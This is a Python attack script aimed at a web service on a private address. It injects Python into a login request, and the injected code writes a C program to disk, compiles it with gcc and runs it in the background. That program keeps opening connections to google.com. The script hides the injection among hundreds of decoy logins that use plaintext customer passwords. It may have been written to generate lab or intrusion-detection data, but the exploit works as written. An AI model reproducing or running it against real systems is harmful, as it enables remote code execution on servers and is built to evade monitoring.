import requests
import random
address="192.168.0.113:7080"
def randint(i):
	return random.randrange(0,i)

escaped_payload='{"username": "cust1", "password": "RestlessSou7"}'
escaped_payload=escaped_payload+';p=open("MWzF2MqBWW.c","w")'
escaped_payload=escaped_payload+';p.write(\'#include <stdio.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <string.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <stdlib.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <unistd.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <fcntl.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <netinet/tcp.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <sys/socket.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <sys/types.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <netinet/in.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#include <netdb.h>\\n\')'
escaped_payload=escaped_payload+';p.write(\'#define BUFFER_SIZE 1024\\n\')'
escaped_payload=escaped_payload+';p.write(\'int socket_connect(char *host, in_port_t port){\\n\')'
escaped_payload=escaped_payload+';p.write(\'struct hostent* hp;\\n\')'
escaped_payload=escaped_payload+';p.write(\'struct sockaddr_in addr;\\n\')'
escaped_payload=escaped_payload+';p.write(\'int sock;\\n\')'
escaped_payload=escaped_payload+';p.write(\'int on = 1;\\n\')'
escaped_payload=escaped_payload+';p.write(\'if((hp=gethostbyname(host))==NULL){\\n\')'
escaped_payload=escaped_payload+';p.write(\'herror("gethostbyname");\\n\')'
escaped_payload=escaped_payload+';p.write(\'exit(1);}\\n\')'
escaped_payload=escaped_payload+';p.write(\'bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);\\n\')'
escaped_payload=escaped_payload+';p.write(\'addr.sin_port = htons(port);\\n\')'
escaped_payload=escaped_payload+';p.write(\'addr.sin_family = AF_INET;\\n\')'
escaped_payload=escaped_payload+';p.write(\'sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\\n\')'
escaped_payload=escaped_payload+';p.write(\'setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));\\n\')'
escaped_payload=escaped_payload+';p.write(\'if(sock == -1){\\n\')'
escaped_payload=escaped_payload+';p.write(\'perror("setsockopt");exit(1);}\\n\')'
escaped_payload=escaped_payload+';p.write(\'if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){perror("connect");exit(1);}return sock;}\\n\')'
escaped_payload=escaped_payload+';p.write(\'int main(int argc, char *argv[]){\\n\')'
escaped_payload=escaped_payload+';p.write(\'int fd;\\n\')'
escaped_payload=escaped_payload+';p.write(\'char buffer[BUFFER_SIZE];\\n\')'
escaped_payload=escaped_payload+';p.write(\'if(argc < 3){\\n\')'
escaped_payload=escaped_payload+';p.write(\'fprintf(stderr, "Usage: %s <hostname> <port>\\\\\\n", argv[0]);\\n\')'
escaped_payload=escaped_payload+';p.write(\'exit(1);}\\n\')'
escaped_payload=escaped_payload+';p.write(\'while(1){fd = socket_connect(argv[1], atoi(argv[2]));\\n\')'
escaped_payload=escaped_payload+';p.write(\'write(fd, "GET /Me5HIC2ibF>\\\\\\r>\\\\\\n", strlen("GET /Me5HIC2ibF>\\\\\\r>\\\\\\n"));\\n\')'
escaped_payload=escaped_payload+';p.write(\'bzero(buffer, BUFFER_SIZE);\\n\')'
escaped_payload=escaped_payload+';p.write(\'while(read(fd, buffer, BUFFER_SIZE - 1) != 0){\\n\')'
escaped_payload=escaped_payload+';p.write(\'fprintf(stderr, "%s", buffer);\\n\')'
escaped_payload=escaped_payload+';p.write(\'bzero(buffer, BUFFER_SIZE);\\n\')'
escaped_payload=escaped_payload+';p.write(\'}}\\n\')'
escaped_payload=escaped_payload+';p.write(\'shutdown(fd, SHUT_RDWR);close(fd);\\n\')'
escaped_payload=escaped_payload+';p.write(\'return 0;}\\n\')'
escaped_payload=escaped_payload+';p.close()'
escaped_payload=escaped_payload+';import os'
escaped_payload=escaped_payload+';os.system("gcc MWzF2MqBWW.c -o MWzF2MqBWW")'
escaped_payload=escaped_payload+';os.system("./MWzF2MqBWW google.com 80 &")'
payloadarray=[
	"post('http://'+address+'/token',json={'username': 'cust1', 'password': 'RestlessSou7'})",
	"post('http://'+address+'/token',json={'username': 'cust2', 'password': 'Plinking@13'})",
	"post('http://'+address+'/token',json={'username': 'cust3', 'password': 'Hebrew_357'})",
	"post('http://'+address+'/token',json={'username': 'cust4', 'password': 'JackJack!!2'})",
	"post('http://'+address+'/token',json={'username': 'cust5', 'password': 'BingoWinner*123'})",
	"post('http://'+address+'/token',json={'username': 'cust6', 'password': 'WallopKirk_96'})",
	"post('http://'+address+'/other',json={'username': 'cust1', 'password': 'RestlessSou7'})",
	"post('http://'+address+'/other',json={'username': 'cust2', 'password': 'Plinking@13'})",
	"post('http://'+address+'/other',json={'username': 'cust3', 'password': 'Hebrew_357'})",
	"post('http://'+address+'/other',json={'username': 'cust4', 'password': 'JackJack!!2'})",
	"post('http://'+address+'/other',json={'username': 'cust5', 'password': 'BingoWinner*123'})",
	"post('http://'+address+'/other',json={'username': 'cust6', 'password': 'WallopKirk_96'})",
	"post('http://'+address+'/',json={'username': 'cust1', 'password': 'RestlessSou7'})",
	"post('http://'+address+'/',json={'username': 'cust2', 'password': 'Plinking@13'})",
	"post('http://'+address+'/',json={'username': 'cust3', 'password': 'Hebrew_357'})",
	"post('http://'+address+'/',json={'username': 'cust4', 'password': 'JackJack!!2'})",
	"post('http://'+address+'/',json={'username': 'cust5', 'password': 'BingoWinner*123'})",
	"post('http://'+address+'/',json={'username': 'cust6', 'password': 'WallopKirk_96'})"
]
for i in range(0,300):
	eval("requests."+payloadarray[randint(len(payloadarray))])
print("confusers pushed")
requests.post('http://'+address+'/token',data=escaped_payload)
print(escaped_payload)
print("payload pushed")
for i in range(0,100):
	eval("requests."+payloadarray[randint(len(payloadarray))])
print("confusers2 pushed")
